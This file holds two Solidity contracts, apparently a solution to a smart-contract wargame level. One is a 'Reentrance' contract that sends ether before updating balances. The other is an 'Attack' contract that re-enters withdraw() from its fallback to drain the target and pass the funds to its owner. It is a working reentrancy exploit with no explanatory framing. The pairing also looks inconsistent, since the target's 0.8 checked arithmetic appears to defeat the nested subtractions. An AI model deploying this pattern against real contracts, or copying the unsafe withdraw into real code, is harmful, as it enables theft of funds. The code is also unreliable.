// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./Reentrance.sol";

contract Attack {
    Reentrance public reentrance;
    address public owner;

    constructor(address payable a) public {
        reentrance = Reentrance(a);
        owner = msg.sender;
    }

    function attack() public payable {
        reentrance.donate(address(this));
        reentrance.withdraw(1000000000000000);
    }

    function withdrawToEOA() public {
        require(msg.sender == owner);
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success);
    }

    fallback() external payable {
        if (address(reentrance).balance > 1000000000000000) {
            reentrance.withdraw(1000000000000000);
        }
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrance {
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}